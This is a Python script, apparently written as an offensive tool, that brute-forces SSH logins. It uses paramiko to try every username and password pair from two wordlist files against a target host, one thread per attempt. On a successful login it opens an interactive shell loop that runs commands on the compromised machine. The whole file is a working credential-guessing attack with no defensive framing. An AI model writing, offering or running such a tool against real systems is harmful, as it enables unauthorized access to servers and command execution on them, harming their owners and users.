import paramiko
import socket
import threading
import time

def ssh_brute_force(host, port, username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=port, username=username, password=password)
        print(f"[+] Successful login: {username}:{password}")
        while True:
            command = input("$ ")
            stdin, stdout, stderr = ssh.exec_command(command)
            print(stdout.read().decode())
    except paramiko.ssh_exception.AuthenticationException:
        print(f"[-] Failed login: {username}:{password}")
    finally:
        ssh.close()

def main():
    host = input("Enter the target host: ")
    port = int(input("Enter the target port (default: 22): ") or "22")
    username_file = input("Enter the path to the username file: ")
    password_file = input("Enter the path to the password file: ")

    with open(username_file, "r") as f:
        usernames = f.read().splitlines()
    with open(password_file, "r") as f:
        passwords = f.read().splitlines()

    for username in usernames:
        for password in passwords:
            thread = threading.Thread(target=ssh_brute_force, args=(host, port, username, password))
            thread.start()
            time.sleep(1)

if __name__ == "__main__":
    main()
